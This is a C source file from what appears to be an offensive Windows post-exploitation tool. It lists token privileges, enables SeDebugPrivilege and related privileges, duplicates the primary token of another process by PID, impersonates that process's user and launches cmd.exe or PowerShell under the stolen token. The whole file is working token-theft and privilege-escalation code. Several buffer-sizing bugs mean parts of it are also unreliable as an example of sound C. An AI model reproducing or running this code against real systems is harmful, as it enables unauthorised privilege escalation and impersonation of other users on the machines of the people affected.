/*
* Author: Aleksa Zatezalo
* Date: September 2024
* Description: Returns basic token info and allows for impersonation.
*/

#include "token_info.h"
#include "doexec.h"
#include <sddl.h>
#include <userenv.h>
#include <stdlib.h>
#include <Lmcons.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <aclapi.h>

#define ERROR_NOT_ALL_ASSIGNED 1300L

char* getTokenPrivilegesAsString(HANDLE hToken) {
    DWORD dwSize = 0;
    GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwSize);

    PTOKEN_PRIVILEGES pTokenPrivileges = (PTOKEN_PRIVILEGES)malloc(dwSize);
    if (pTokenPrivileges == NULL) {
        return NULL;
    }

    if (!GetTokenInformation(hToken, TokenPrivileges, pTokenPrivileges, dwSize, &dwSize)) {
        free(pTokenPrivileges);
        return NULL;
    }

    // Estimate size for output string
    size_t outputSize = 0;
    for (DWORD i = 0; i < pTokenPrivileges->PrivilegeCount; i++) {
        DWORD dwNameSize = 0;
        LookupPrivilegeName(NULL, &pTokenPrivileges->Privileges[i].Luid, NULL, &dwNameSize);
        outputSize += dwNameSize + 50; // Add space for attributes and formatting
    }

    char* output = (char*)malloc(outputSize);
    if (output == NULL) {
        free(pTokenPrivileges);
        return NULL;
    }
    
    // Prepare the output string
    char* current = output;
    for (DWORD i = 0; i < pTokenPrivileges->PrivilegeCount; i++) {
        DWORD dwNameSize = 0;
        LookupPrivilegeName(NULL, &pTokenPrivileges->Privileges[i].Luid, NULL, &dwNameSize);
        char* privilegeName = (char*)malloc(dwNameSize);
        LookupPrivilegeName(NULL, &pTokenPrivileges->Privileges[i].Luid, privilegeName, &dwNameSize);

        // Append privilege information to output string
        int len = sprintf(current, "%s: %s\n", privilegeName,
                          (pTokenPrivileges->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED) ? "Enabled" : "Disabled");
        current += len;

        free(privilegeName);
    }

    free(pTokenPrivileges);
    return output;
}

BOOL hasTokenPermission(HANDLE hToken, DWORD desiredAccess) {
    HANDLE hTokenDup;
    if (DuplicateTokenEx(hToken, desiredAccess, NULL, SecurityImpersonation, TokenPrimary, &hTokenDup)) {
        CloseHandle(hTokenDup);
        return TRUE;
    }
    return FALSE;
}

char *printUserInfoFromToken(DWORD processId) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processId);
    char *error = "ERROR";
    char *result;
    char *banner = "[!] Associated user: ";
    if (hProcess == NULL) {
        printf("Error opening process: %d\n", GetLastError());
        return error;
    }

    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
        printf("Error opening process token: %d\n", GetLastError());
        CloseHandle(hProcess);
        return error;
    }

    DWORD tokenInfoLength = 0;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &tokenInfoLength);
    PTOKEN_USER pTokenUser = (PTOKEN_USER)malloc(tokenInfoLength);
    if (!GetTokenInformation(hToken, TokenUser, pTokenUser, tokenInfoLength, &tokenInfoLength)) {
        printf("Error getting token information: %d\n", GetLastError());
        free(pTokenUser);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return error;
    }

    char* privilegesString = getTokenPrivilegesAsString(hToken);
    char* debug_required = "\r\n[!] The Debug privilege may be required.";
    char* has_duplicate = "\r\n     [-] Token does not have duplicate perms.";
    char* has_impersonate  = "\r\n     [-] Token does not have impersonate perms. \r\n";
    if (hasTokenPermission(hToken, TOKEN_DUPLICATE)){
        has_duplicate = "\r\n     [+] Token has duplicate perms.";
    }
    if (hasTokenPermission(hToken, TOKEN_IMPERSONATE)){
        has_impersonate  = "\r\n     [+] Token has have impersonate perms.";
    }
    if (hasTokenPermission(hToken, TOKEN_IMPERSONATE) & hasTokenPermission(hToken, TOKEN_DUPLICATE)){
        debug_required = "\r\n[+] The Debug privilege may not be required.";
    }


    // Convert SID to string
    LPTSTR sidString;
    if (ConvertSidToStringSid(pTokenUser->User.Sid, &sidString)) {
        LocalFree(sidString);
    }

    // Get user name and domain
    DWORD userNameLen = 0;
    DWORD domainNameLen = 0;
    SID_NAME_USE sidType;
    
    LookupAccountSid(NULL, pTokenUser->User.Sid, NULL, &userNameLen, NULL, &domainNameLen, &sidType);
    
    TCHAR* userName = (TCHAR*)malloc(userNameLen * sizeof(TCHAR));
    TCHAR* domainName = (TCHAR*)malloc(domainNameLen * sizeof(TCHAR));

    if (!LookupAccountSid(NULL, pTokenUser->User.Sid, userName, &userNameLen, domainName, &domainNameLen, &sidType)) {
        result = "ERROR: Process potentially terminated.";
    }

    result = malloc(( strlen(banner) + strlen(userName) + strlen(domainName) + strlen(has_duplicate) + strlen(has_impersonate) + strlen(debug_required) + 2)*sizeof(char));
    strcpy(result, banner);
    strcat(result, domainName);
    strcat(result, "\\");
    strcat(result, userName);
    strcat(result, debug_required);
    strcat(result, has_duplicate);
    strcat(result, has_impersonate);

    // Cleanup
    free(userName);
    free(domainName);
    free(pTokenUser);
    CloseHandle(hToken);
    CloseHandle(hProcess);
    return result;
}

char *enableDebugPrivilege() {
    HANDLE hToken;
    char *result;
    char *failedProc = "[-] OpenProcessToken error\r\n";
    char *lookupError = "[-] LookupPrivilegeValue error\r\n";
    char *adjustError = "[-] AdjustTokenPrivileges error\r\n";
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        result = malloc(sizeof(failedProc) + 1);
        strcpy(result, failedProc);
        return result;
    }

    LUID luid;
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        result = malloc(sizeof(lookupError) + 1);
        strcpy(result, lookupError);
        return result;
    }

    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        result = malloc(sizeof(adjustError) + 1);
        strcpy(result, adjustError);
        return result;
    }
    CloseHandle(hToken);
    
    char *goodProc = "[+] Local process token opened.\r\n";
    char *goodLookup = "[+] Privilege list received.\r\n";
    char *goodAdjust = "[+] Debug privilege enabled.\r\n";
    int len = strlen(goodProc) + strlen(goodLookup) + strlen(goodAdjust);
    int size = len * sizeof(char);
    result = malloc(size + 1);
    strcpy(result, goodProc);
    strcat(result, goodLookup);
    strcat(result, goodAdjust);
    return result;
}

BOOL enableAssignPrimaryTokenPrivilege() { 
    HANDLE hToken;
    
    // Open the process token
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return FALSE;
    }

    LUID luid;
    // Look up the LUID for the "Assign Primary Token" privilege
    if (!LookupPrivilegeValue(NULL, SE_ASSIGNPRIMARYTOKEN_NAME, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // Adjust the token privileges
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    
    // Success messages    
    return TRUE;
}

BOOL enableIncreaseQuotaPrivilege() { 
    HANDLE hToken;

    // Open the process token
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return FALSE;
    }

    LUID luid;
    // Look up the LUID for the "Increase Quota" privilege
    if (!LookupPrivilegeValue(NULL, SE_INCREASE_QUOTA_NAME, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // Adjust the token privileges
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    
    // Success
    return TRUE;
}


char *getName(){
    char username[256]; 
    DWORD username_len = sizeof(username);  // Length of the buffer
    char *result;
    char *intro = "[+] Current user: ";
    memset(username, 0, 256);
    // Get the username of the current user
    if (GetUserNameA(username, &username_len)) {
       result = malloc(sizeof(intro) + sizeof(username) + 3);
       strcpy(result, intro);
       strcat(result, username);
       strcat(result, "\r\n");
    } else {    
        char *fail = "Failed to get username.\r\n";
        result = malloc(sizeof(fail));
        strcpy(result, fail);
    }

    return result;
}

HANDLE getPrimaryTokenFromProcess(DWORD processId) {
    // Open the target process with necessary access rights
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE, FALSE, processId);
    if (!hProcess) {
        printf("OpenProcess failed (Error: %lu)\n", GetLastError());
        return NULL;
    }

    HANDLE hToken;
    // Open the process token with TOKEN_QUERY and TOKEN_DUPLICATE access rights
    if (!OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken)) {
        printf("OpenProcessToken failed (Error: %lu)\n", GetLastError());
        CloseHandle(hProcess);
        return NULL;
    }

    HANDLE hPrimaryToken;
    // Duplicate the token to create a primary token
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimaryToken)) {
        printf("DuplicateTokenEx failed (Error: %lu)\n", GetLastError());
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return NULL;
    }
    // Clean up handles
    CloseHandle(hToken);    // Close the original token handle
    CloseHandle(hProcess);  // Close the process handle

    return hPrimaryToken; // Return the primary token handle
}


void launchProcessAsUser(HANDLE hToken) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Launch calc.exe
    if (!CreateProcessAsUser(
            hToken,                // User's token
            NULL,                  // No module name (use command line)
            "C:\\Windows\\System32\\cmd.exe", // Command line
            NULL,                  // Process security attributes
            NULL,                  // Primary thread security attributes
            FALSE,                 // Handle inheritance
            0,                     // Creation flags
            NULL,                  // Use parent's environment block
            NULL,                  // Use parent's starting directory 
            &si,                   // Pointer to STARTUPINFO structure
            &pi)                   // Pointer to PROCESS_INFORMATION structure
    ) {
        printf("CreateProcessAsUser failed (%d).\n", GetLastError());
    } else {
        // Successfully created process
        printf("Process launched successfully.\n");
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

void ExecutePowerShellAsUser(HANDLE hToken) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    // Initialize the structures
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Set the startup info to create a console window
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;

    // Command to execute PowerShell
    LPCSTR command = "powershell.exe";

    // Create the process with the impersonated user token
    if (CreateProcessAsUserA(
            hToken,           // User token
            NULL,             // Application name
            (LPSTR)command,   // Command line
            NULL,             // Process security attributes
            NULL,             // Primary thread security attributes
            FALSE,            // Handle inheritance
            0,                // Creation flags
            NULL,             // Use parent's environment block
            NULL,             // Use parent's starting directory
            &si,              // Pointer to STARTUPINFO
            &pi               // Pointer to PROCESS_INFORMATION
        )) {
        // Wait for the command to complete
        WaitForSingleObject(pi.hProcess, INFINITE);

        // Close process and thread handles
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        printf("CreateProcessAsUser failed (%d).\n", GetLastError());
    }
}

char *impersonate(int pid){
    char *firstUser = getName();
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    HANDLE hToken = getPrimaryTokenFromProcess(pid);
    char *open = "[-] Failed to obtain duplicated token.\r\n";
    char *newUser = getName();
    char *impersonation = "[+] Impersonation successfull.\r\n";
    HANDLE hUserToken;
    
    if (hToken) {
        open = "[+] Obtained duplicated token.\r\n";
        
        // Impersonate the user
        if (!ImpersonateLoggedOnUser(hToken)) {
            impersonation = "[-] Impersonation unsuccessfull.\r\n";
            CloseHandle(hToken);
        }

        
        if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hUserToken)) {
            // Prepare the PowerShell command
            ExecutePowerShellAsUser(hToken);
            CloseHandle(hUserToken);
        } else {
            printf("DuplicateTokenEx failed (%d).\n", GetLastError());
        }

        newUser = getName();
        RevertToSelf();
        CloseHandle(hToken);
    }

    char *result = malloc((strlen(firstUser) + strlen(open) + strlen(newUser) +strlen(impersonation))*sizeof(char) + 2); 
    strcpy(result, firstUser);
    strcat(result, open);
    strcat(result, impersonation);
    strcat(result, newUser);
    return result;
}